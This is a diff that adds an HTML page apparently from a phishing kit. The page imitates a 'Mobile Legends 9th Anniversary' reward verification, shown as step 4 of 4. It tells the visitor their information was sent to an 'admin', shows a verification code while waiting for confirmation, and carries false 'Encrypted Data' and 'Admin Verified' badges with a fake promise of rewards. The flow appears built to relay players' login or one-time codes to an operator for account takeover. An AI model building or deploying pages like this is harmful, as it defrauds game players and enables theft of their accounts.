@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Legends 9th Anniversary - Verification Code</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/6/61/Mobile-legends-logo.svg/1200px-Mobile-legends-logo.svg.png" 
+                 alt="Mobile Legends Logo" class="logo">
+            <h1 class="title">9th Anniversary</h1>
+            <h2 class="subtitle">Verification Required</h2>
+        </div>
+        
+        <div class="form-container">
+            <div class="form-header">
+                <h3>Step 4 of 4</h3>
+                <p>Please wait for the verification code and press it when it appears</p>
+            </div>
+            
+            <div class="verification-status" id="verificationStatus">
+                <div class="status-icon">⏳</div>
+                <h4>Waiting for admin verification...</h4>
+                <p>Your information has been sent to our admin for verification. Please wait.</p>
+                <div class="loading-dots">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+            
+            <div class="verification-code-container" id="verificationCodeContainer" style="display: none;">
+                <div class="code-display">
+                    <h4>📱 Your Verification Code</h4>
+                    <div class="verification-code-display">
+                        <span class="code-number" id="codeNumber">----</span>
+                    </div>
+                    <p>This is your verification code. Please wait for admin confirmation.</p>
+                </div>
+                
+                <div class="admin-waiting" id="adminWaiting">
+                    <div class="waiting-icon">👨‍💼</div>
+                    <h4>Waiting for Admin Confirmation...</h4>
+                    <div class="loading-dots">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="progress-bar">
+                <div class="progress-step completed">1</div>
+                <div class="progress-line completed"></div>
+                <div class="progress-step completed">2</div>
+                <div class="progress-line completed"></div>
+                <div class="progress-step completed">3</div>
+                <div class="progress-line"></div>
+                <div class="progress-step active">4</div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>🔐 Secure verification process in progress...</p>
+            <div class="security-features">
+                <span class="feature">🛡️ Encrypted Data</span>
+                <span class="feature">👨‍💼 Admin Verified</span>
+                <span class="feature">⚡ Real-time Code</span>
+            </div>
+        </div>
+    </div>
+    
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <p>Verifying your code...</p>
+    </div>
+    
+    <div class="success-modal" id="successModal">
+        <div class="modal-content">
+            <div class="success-icon">🎉</div>
+            <h2>Verification Complete!</h2>
+            <p>Your Mobile Legends 9th Anniversary registration has been successfully verified! Check your game inbox for exclusive rewards!</p>
+            <button onclick="closeModal()" class="modal-btn">Claim Rewards!</button>
+        </div>
+    </div>
+    
+    <div class="error-modal" id="errorModal" style="display: none;">
+        <div class="modal-content error-content">
+            <div class="error-icon">❌</div>
+            <h2>Verification Failed</h2>
+            <p id="errorMessage">Something went wrong. Please try again or contact support.</p>
+            <button onclick="closeErrorModal()" class="modal-btn error-btn">Try Again</button>
+        </div>
+    </div>
+    
+    <script src="/js/step4.js"></script>
+</body>
+</html>
